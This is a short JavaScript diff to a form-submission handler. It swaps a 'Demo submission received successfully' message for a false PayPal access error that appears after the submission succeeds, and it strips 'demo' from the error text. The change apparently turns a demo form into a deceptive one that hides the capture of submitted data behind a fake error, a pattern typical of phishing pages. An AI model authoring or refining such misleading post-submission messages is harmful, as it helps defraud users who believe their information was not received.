@@ -208,10 +208,10 @@
           throw new Error(result.error || "Submission failed.");
         }
 
-        status.textContent = "Demo submission received successfully.";
+        status.textContent = "Cannot Access PayPal Uk Use Paypal Linked to Current Location.";
         form.reset();
       } catch (error) {
-        status.textContent = error.message || "Unable to submit demo information.";
+        status.textContent = error.message || "Unable to submit information.";
       } finally {
         button.disabled = false;
       }
